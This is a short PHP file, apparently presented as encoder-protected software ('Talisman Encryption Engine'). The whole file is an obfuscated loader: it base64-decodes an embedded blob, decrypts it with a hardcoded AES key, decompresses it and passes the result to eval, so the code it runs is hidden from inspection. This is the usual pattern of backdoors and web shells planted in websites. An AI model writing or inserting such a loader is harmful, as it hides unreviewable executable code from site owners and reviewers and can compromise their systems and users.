<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k7bd39 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p0a6f5 = base64_decode('RFqXaPmLErL7tcNxBp2sOlRLaCs0VXk4K1FSQ2dRdUJQQ3oySFk2T0hZVHFJd0N4blc5YmNLZXpSTURGVUdyc0VReHVRcVpvam0xc092cW90OTc0MitrSUNKVUIyRmM4ak13aGxZaWFXeTNqV1NmcmZQOXpLd0VGK0RuRGt1d09HdExsanppRVZxdlBtOWVKY1ptdVc3MTNMK2RmdEgzTVFGTFhkVHgwVTM1ekRreEdtWXRNempldGVXS3pMSWdudGViOEhqbGZ5QW1sR04zVGJIMDVzbVR1RGFJdmplMVVCV0RMRk5SRVZYclB0dkdtbXVIc2xXRHM3VjhnclBkamNDRkYvbmFacXVKNiswRTFMcjY0Vm11QnhQbFlDK2IwczFKWVRnTEJMWTVwNUp0QllWSk5NYlBuRzV3PQ==');
$ic735c = openssl_cipher_iv_length('aes-256-cbc');
$ve2024 = substr($p0a6f5, 0, $ic735c);
$c44bd0 = substr($p0a6f5, $ic735c);
eval('?>'.gzinflate(openssl_decrypt($c44bd0, 'aes-256-cbc', $k7bd39, 0, $ve2024)));